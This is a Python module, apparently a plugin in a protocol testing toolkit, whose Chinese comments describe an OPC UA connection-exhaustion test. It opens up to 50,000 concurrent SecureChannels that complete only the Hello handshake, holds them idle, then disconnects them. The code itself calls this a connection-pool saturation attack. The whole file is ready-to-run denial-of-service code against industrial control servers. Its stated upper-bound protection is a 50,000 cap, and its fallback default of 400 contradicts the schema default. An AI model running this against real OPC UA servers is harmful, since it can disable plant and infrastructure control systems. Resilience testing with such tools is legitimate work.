"""
測項：OPC UA 連線耗盡測試（Hello/Acknowledge 握手佔用）
分類：OPC UA
說明：許多 OPC UA Server 對同時 SecureChannel/Session 數量有限制，
     建立大量僅完成 Hello 交握、長時間閒置的連線，測試其連線數上限與逾時回收機制。

連線生命週期受 duration 與 stop_event 控制，測試結束時會逐一呼叫 disconnect_socket()，
確保不會在目標留下大量閒置連線；concurrent_channels 為可調參數，並有上限保護。
需求套件：pip install asyncua
"""
import asyncio
import time

from ..common import clamp_duration

NAME = "OPC UA Hello 連線耗盡測試"
CATEGORY = "OPC UA"
PROTOCOL = "TCP"
DEFAULT_PORT = 4840
TEST_TYPE = "resource"  # 連線型：同時建立並長時間持有大量 SecureChannel，屬連線池飽和攻擊


def get_param_schema() -> dict:
    return {
        "concurrent_channels": {"type": "int", "default": 50000, "min": 1, "max": 50000, "desc": "同時維持的 SecureChannel 數量（以 asyncio coroutine 平行建立，非 OS thread，數量對攻擊端負擔相對低）"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from asyncua import Client
    except ImportError:
        log_fn("[!] 未安裝 asyncua，請先執行 pip install asyncua")
        return {"opened": 0, "failed": 0, "error": "asyncua not installed"}

    duration = clamp_duration(duration)
    n = int(params.get("concurrent_channels", 400))
    url = f"opc.tcp://{target}:{port}"

    async def _main():
        clients = []
        stats = {"opened": 0, "failed": 0}

        async def open_channel():
            c = Client(url=url)
            try:
                await c.connect_socket()
                await c.send_hello()
                clients.append(c)
                stats["opened"] += 1
            except Exception:  # noqa: BLE001
                stats["failed"] += 1

        await asyncio.gather(*(open_channel() for _ in range(n)))
        log_fn(f"[+] 已開啟 {stats['opened']} 條 SecureChannel（失敗 {stats['failed']}）")

        start = time.time()
        while time.time() - start < duration and not (stop_event and stop_event.is_set()):
            await asyncio.sleep(1)

        for c in clients:
            try:
                await c.disconnect_socket()
            except Exception:  # noqa: BLE001
                pass

        return stats, time.time() - start

    stats, elapsed = asyncio.run(_main())
    return {"opened": stats["opened"], "failed": stats["failed"], "elapsed_sec": round(elapsed, 1)}
